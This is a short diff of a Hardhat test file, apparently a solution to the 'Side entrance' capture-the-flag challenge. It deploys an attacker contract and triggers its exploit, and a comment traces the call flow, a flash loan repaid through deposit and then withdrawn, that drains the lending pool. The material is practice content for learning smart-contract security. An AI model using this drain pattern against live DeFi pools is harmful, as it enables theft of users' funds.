@@ -31,11 +31,12 @@ describe("[Challenge] Side entrance", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
+    // 1. Deploy the attacker
     const attacker = await (
       await ethers.getContractFactory("SideEntranceLenderPoolAttacker", player)
     ).deploy(pool.address);
 
-    // 1. Calls flow is:
+    // 2. Exploit. Calls flow is:
     // `attacker.exploit()` -> `pool.flashLoan()` -> `attacker.execute()` -> `pool.deposit()` ->
     // `pool.flashLoan()` -> `attacker.exploit()` -> `pool.withdraw()` -> `attacker.exploit()`
     await attacker.connect(player).exploit();
